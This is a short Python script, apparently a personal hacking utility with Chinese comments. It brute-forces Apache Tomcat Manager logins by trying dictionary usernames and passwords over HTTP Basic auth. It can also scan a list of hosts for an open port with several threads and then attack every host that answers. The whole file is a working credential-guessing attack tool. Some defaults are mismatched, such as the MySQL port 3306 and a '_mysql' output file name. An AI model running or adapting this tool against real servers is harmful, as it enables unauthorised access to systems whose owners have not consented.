#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-05-29 20:13:27
# @Author  : crhua 

import sys
import requests
import socket
import base64
from threading import Thread
from optparse import OptionParser


"""
brute tomcat login
"""
def brute(ip,port,users,passwds):
	url = "http://{0}:{1}/manager/html".format(ip,port)
	try:
		res = requests.get(url,timeout=5,allow_redirects=True, verify=False)
		rcode = res.status_code
		if rcode == 401:
			for u in users:
				for p in passwds:
					u = u.strip()
					p = p.strip()
					# print(p)
					try:
						headers = {
							"Authorization": 'Basic '+base64.b64encode(u+":"+p)
						}
						tres = requests.get(url,headers=headers,timeout=4, verify=False)
						tcode = tres.status_code
						if tcode == 200:
							res = "[+] success: {0}:{1} ---- 弱口令为：{2}:{3}".format(ip,port,u,p)
							# print(res)
							result.append(res)
							return res
					except Exception as e:
						# print(e)
						pass

"""
多个目标
"""
def run(func,threadnum,ips,port,user_dic,passwd_dic):
	for i in range(1,threadnum + 1):
		threads = [Thread(target=func,args=(u,port,user_dic,passwd_dic,)) for u in ips]
	for t in threads:
		t.start()
	for t in threads:
		t.join()

"""
扫描开放端口
"""
def scan(ip,port,filename):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	try:
		res = s.connect_ex((ip,int(port)))
		if res == 0:
			with open(filename,'a+') as f:
				f.write("{0}\n".format(ip))
	except:
		pass


if __name__ == '__main__':
	#帮助
	usage = "Usage: python %prog [options] args"
	parser = OptionParser(usage,version="%prog 0.1 ")
	parser.add_option("-t", dest="host", help="target host")
	parser.add_option("-p", dest="port", default="3306", help="target port")
	parser.add_option("-u", dest="user", help="user dic")
	parser.add_option("-P", dest="passwd", help="passwd dic")
	parser.add_option("-a", dest="hosts" , help="target hosts file")
	options,args = parser.parse_args()

	"""
	获取用户参数 -u -P -p
	"""
	if options.user:
		user = options.user
	else:
		print("Please specify -u parameters")
		sys.exit(0)

	if options.passwd:
		passwd = options.passwd
	else:
		print("Please specify -P parameters")
		sys.exit(0)

	if options.port:
		port = options.port

	"""
	tmp_list 存放所有文件内的ip
	last_list 存放只开放tomcat的ip
	result 结果存放列表
	threadnum 多线程数量
	"""
	tmp_list = []
	last_list = []
	result = []
	threadnum = 10

	with open(user,'r') as f:
		users = f.readlines()
	with open(passwd,'r') as g:
		passwds = g.readlines()
	f.close()
	g.close()

	if options.host:
		host = options.host
		brute(host,port,users,passwds)
	elif options.hosts:
		file_path = options.hosts
		with open(file_path,'r') as f:
			_tmp = f.readlines()
		for i in _tmp:
			i = i.strip()
			tmp_list.append(i)
		f.close()
		# print(tmp_list)
		"""
		多线程获取端口开放
		"""
		file_name = "{0}_mysql.txt".format(port)
		for i in range(10):
			threads = [Thread(target=scan,args=(u,port,file_name,)) for u in tmp_list]
		for t in threads:
			t.start()
		for t in threads:
			t.join()
		print(file_name)

		"""
		暴力破解tomcat
		"""
		with open(file_name,'r') as f:
			_last = f.readlines()
		for i in _last:
			i = i.strip()
			last_list.append(i)
		run(brute,threadnum,last_list,port,users, passwds)
	else:
		print("Error! Please use -h param")

	for m in result:
		print(m)


		

